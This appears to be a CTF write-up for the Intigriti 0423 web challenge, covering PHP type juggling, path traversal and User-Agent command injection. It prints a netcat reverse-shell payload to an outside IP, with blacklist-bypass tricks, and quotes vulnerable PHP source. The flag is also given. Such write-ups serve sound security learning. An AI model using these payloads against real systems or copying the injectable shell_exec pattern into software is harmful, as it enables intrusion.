---
layout: post
title: Intigriti Challenge 0423 Write-Up
date: 2023-05-02 09:50 +0900
tags: [php, lfi, type-juggling, rce, web, challenge]
categories: [web, intigriti]
toc: true
---

# 0423 Challenge Write-Up

- URL : [https://challenge-0423.intigriti.io/](https://challenge-0423.intigriti.io/)

The challenge consists of 3 main steps. Not a lot of guessing is required but you do need to think outside the box.

## Step 1.

First, when the main challenge page(`challenge.php`) shows the default credentials which is username = `strange`, password = `monkey`.

![Untitled](/assets/img/20230502/Untitled.png)

I tried random credentials and other well known credentials like “`admin/admin`” but it did not work, and redirected me to `index_error.php` which was pretty odd.

![Untitled](/assets/img/20230502/Untitled%201.png)

The `index_error.php` page looked exactly the same as the `challenge.php` but it had 2 differences.

1. There was an “`error`” parameter which was reflected in page (XSS is possible)
2. A commented code inside the HTML source as below

```html
<!-- dev TODO : remember to use strict comparison -->
```

Obviously the message above was talking about PHP’s loose comparison.

Keeping the information in mind, I logged in with the valid credentials and was able to see a page(`dashboard.php`) as below.

![Untitled](/assets/img/20230502/Untitled%202.png)

While logging in, the server set 2 cookies.

1. `username=strange`
2. `account_type=dqwe13fdsfq2gys388`

I figured that these were used in the `dashboard.php` and tried to make an error to see if I could leak bits of the source code.

So, I turned the cookie keys to array types, `username[]` and `account_type[]`. As expected the php error occured and I could see that one of cookie value would be turned to MD5. With trial and error I learned it was `account_type`.

![Untitled](/assets/img/20230502/Untitled%203.png)

With a little searching I found a github repo as below and used the MD5 magic hash.

- [https://github.com/spaze/hashes](https://github.com/spaze/hashes)

Immediately there was a difference in the page. It showed a new image and the HTML source code contained part two of the challange.

```html
<h3 id="custom_image.php - try to catch the flag.txt ;)">A special golden wall just for Premium Users ;) </h3>
```

## Step 2.

Going to `custom_image.php`, the page was literally empty and I could not read `flag.txt` as it kept throwing a `403`. 

![Untitled](/assets/img/20230502/Untitled%204.png)

There was not much to do, but it was strange how just an image was set in a php file. So, I used FFUF to do a little parameter digging and found that `file` parameter was used.

```bash
$ ffuf -w ./params -u https://challenge-0423.intigriti.io/custom_image.php\?FUZZ -fs 294923
```

![Untitled](/assets/img/20230502/Untitled%205.png)

I used the `file` parameter to read `flag.txt` but it gave me a “Permission denied!”

I tried reading a different file like one of the png that was used in the `dashboard.php` like “`www/web/images/logo-dashboard.png`” and it worked.

Again I tried making an error by making the `file` parameter into an array to see a bit of the php code.

![Untitled](/assets/img/20230502/Untitled%206.png)

It looked like ‘`../`’ was replaced or filtered and to bypass it I used HTML encoding. `%2E%2E%5C` == `..\`

![Untitled](/assets/img/20230502/Untitled%207.png)

I could get the base64 text from `flag.txt` and when I decoded it, I got text as below.

```
Hey Mario, the flag is in another path! Try to check here:

/e7f717ed-d429-4d00-861d-4137d1ef29az/9709e993-be43-4157-879b-78b647f15ff7/admin.php
```

Now, to step 3.

!!! Before I moved on to the next part, I download each php file using `custom_image.php`.

## Step 3.

The `admin.php` source code is as followed.

```php
<?php
if(isset($_COOKIE["username"])) {
  $a = $_COOKIE["username"];
  if($a !== 'admin'){
    header('Location: /index_error.php?error=invalid username or password');    
  }
}
if(!isset($_COOKIE["username"])){
  header('Location: /index_error.php?error=invalid username or password');
}
?>
<?php
$user_agent = $_SERVER['HTTP_USER_AGENT'];

#filtering user agent
$blacklist = array( "tail", "nc", "pwd", "less", "ncat", "ls", "netcat", "cat", "curl", "whoami", "echo", "~", "+", " ", ",", ";", "&", "|", "'", "%", "@", "<", ">", "\\", "^", "\"", "=");
$user_agent = str_replace($blacklist, "", $user_agent);

shell_exec("echo \"" . $user_agent . "\" >> logUserAgent");
?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Admin panel</title>
  <style>
    body {
      font-family: Arial, Helvetica, sans-serif;
      background-image: url('/www/web/images/another_brick_in_the_wall.jpeg');
      background-position: top 18% right 50%;
      background-repeat: repeat;
    }
    .del {
      color: blue;
    }
    nav>a {
      padding:0.2rem;
      text-decoration: none;
      border: 4px solid grey;
      border-radius: 8px;
      background-color: grey;
    }
    nav>a:visited {
      text-decoration: none;
      color:blue;
    }
    table {
      border: 2px solid black;
      border-radius: 4px;
    }
  </style>
</head>

<body>
  <div>
    <nav>
      <a href="/dashboard.php">Dashboard</a>
      <a href="/e7f717ed-d429-4d00-861d-4137d1ef29az/9709e993-be43-4157-879b-78b647f15ff7/log_page.php">Logs</a>
    </nav>
  </div>
  <div style="padding-top:1rem;position: absolute;left: 2%;">
    <table aria-label="Table of the Users">
      <tbody>
        <tr>
          <th scope="colgroup">Users</th>
        </tr>
        <tr>
          <td>Carlos</td>
          <td class="del">delete</td>
        </tr>
        <tr>
          <td>Wiener</td>
          <td class="del">delete</td>
        </tr>
      </tbody>
    </table>
  </div>
  <div style="position: absolute;right: 2%;">
    <table aria-label="Table of the Agents">
      <tbody>
        <tr style="text-align: center;">
          <th scope="colgroup">Agents</th>
        </tr>
        <tr>
          <td>Pippo</td>
          <td class="del">delete</td>
        </tr>
        <tr>
          <td>Pluto</td>
          <td class="del">delete</td>
        </tr>
      </tbody>
    </table>
  </div>
</body>
</html>
```

The `username` cookie had to be admin and User-Agent was used in `shell_exec`.

```php
#filtering user agent
$blacklist = array( "tail", "nc", "pwd", "less", "ncat", "ls", "netcat", "cat", "curl", "whoami", "echo", "~", "+", " ", ",", ";", "&", "|", "'", "%", "@", "<", ">", "\\", "^", "\"", "=");
$user_agent = str_replace($blacklist, "", $user_agent);

shell_exec("echo \"" . $user_agent . "\" >> logUserAgent");
```

No matter how many times I sent a request, the user-agent value did not concat into `logUserAgent` file.

So, I tried a different approach, bypass `shell_exec`. 

1. Although the User-Agent is wrapped around quotes, it is still possible to execute commands. Ex: ``echo "`ls`"``
2. `str_replace` can be bypassed by wrapping the blacklisted text with the same text. Ex: `ecechoho` → `echo`
3. Space can be bypassed by using `${IFS}`

With all the information above, I put it in the User-Agent.

```
User-Agent: `nncc${IFS}35.197.26.91${IFS}9001${IFS}-e${IFS}/bin/bash`
```

![Untitled](/assets/img/20230502/Untitled9.png)

- Flag : `INTIGRITI{n0_XSS_7h15_m0n7h_p33pz_xD}`